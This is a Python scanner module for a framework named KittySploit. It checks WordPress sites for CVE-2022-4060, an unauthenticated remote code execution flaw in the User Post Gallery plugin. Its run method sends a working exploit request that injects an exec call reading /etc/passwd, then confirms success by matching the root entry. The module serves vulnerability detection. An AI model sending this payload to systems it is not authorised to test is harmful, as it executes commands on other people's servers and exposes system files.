#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress User Post Gallery plugin through 2."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress User Post Gallery <=2.19 - Remote Code Execution Detection',
        'description': 'WordPress User Post Gallery plugin through 2.19 is susceptible to remote code execution. The plugin does not limit which callback functions can be called by users, making it possible for an attacker execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'unauth', 'wpscan', 'rce', 'wordpress', 'wp-plugin', 'wp', 'wp-upg', 'odude', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/8f982ebd-6fc5-452d-8280-42e027d01b1e',
            'https://wordpress.org/plugins/wp-upg/',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-4060',
            'https://github.com/im-hanzou/UPGer',
            'https://github.com/nomi-sec/PoC-in-GitHub',
        ],
        'cve': 'CVE-2022-4060',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:head+-1+/etc/passwd:NULL:NULL', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('recordsFiltered',)
        header_any = ('application/json',)
        body_regexes = ('root:.*:0:0:',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)) and (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='critical',
                reason="WordPress User Post Gallery <=2.19 - Remote Code Execution detected",
                path='/wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:head+-1+/etc/passwd:NULL:NULL',
            )
            return True
        return False

